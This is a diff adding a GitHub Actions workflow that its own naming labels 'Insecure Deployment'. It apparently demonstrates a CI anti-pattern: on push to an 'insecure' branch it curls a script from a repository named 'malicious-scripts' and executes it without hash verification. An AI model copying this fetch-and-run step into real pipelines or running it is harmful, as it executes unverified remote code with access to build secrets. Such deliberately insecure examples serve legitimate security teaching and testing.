@@ -1,0 +1,24 @@
+name: Insecure Deployment
+
+on:  
+  push:  
+    branches:  
+      - insecure  
+
+jobs:  
+  deploy:  
+    runs-on: ubuntu-latest  
+
+    steps:  
+      - name: Checkout Repository  
+        uses: actions/checkout@v3  
+
+      - name: Download and Execute External Script (Without Hash Verification)
+        run: |  
+          DEPLOY_URL="https://raw.githubusercontent.com/LinusTimoDaniels/malicious-scripts/main/deploy.sh"  
+          
+          # Download script
+          curl -o deploy.sh "$DEPLOY_URL"
+  
+          chmod +x deploy.sh  
+          ./deploy.sh  
